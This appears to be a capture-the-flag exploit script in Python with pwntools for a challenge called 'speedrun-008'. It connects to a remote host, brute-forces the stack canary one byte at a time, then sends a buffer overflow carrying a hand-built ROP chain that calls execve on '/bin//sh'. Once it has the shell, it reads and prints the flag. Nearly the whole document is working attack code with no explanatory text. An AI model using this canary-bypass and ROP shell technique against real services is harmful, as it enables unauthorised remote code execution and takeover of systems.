#!/usr/bin/env python2
import sys
import time
from pwn import *
from struct import pack

# context.log_level = logging.DEBUG

# need to figure out the canary

def get_connection():
    # conn = process("./speedrun-008")
    conn = remote(sys.argv[1], int(sys.argv[2]))

    # gdb.attach(conn, '''
    # continue
    # ''')

    return conn


canary = ""
i = 0
while True:
    i += 1

    p = 'a'*1032

    for c in xrange(255):
        canary_try = canary + chr(c)

        print(str(canary_try))

        conn = get_connection()

        conn.recvuntil("Yes?")

        conn.send(p + canary_try)

        result = conn.recvall(timeout=1)

        if "Peace out." in result:
            print("Found canary", c, str(chr(c)))
            canary = canary_try
            break
    print("test", len(canary), str(canary))
    if len(canary) == 8:
        print("found all canaries", str(canary))
        break

# got the canary, now let's exploit

conn = get_connection()

conn.recvuntil("Yes?")
p = 'a'*1032 + canary + 'b'*8

p += pack('<Q', 0x0000000000410253) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004156c4) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f4d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410253) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c20) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f4d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000410253) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000449915) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x00000000004156c4) # pop rax ; ret
p += p64(0x3b)
p += pack('<Q', 0x0000000000474ec5) # syscall ; ret

conn.send(p)

result = conn.recv(timeout=1)

conn.sendline('cat /flag; exit')
result = conn.recvall(timeout=1)
flag = re.search('OOO{[^}]+}', result)
print("FLAG: %s" % flag.group(0))


    
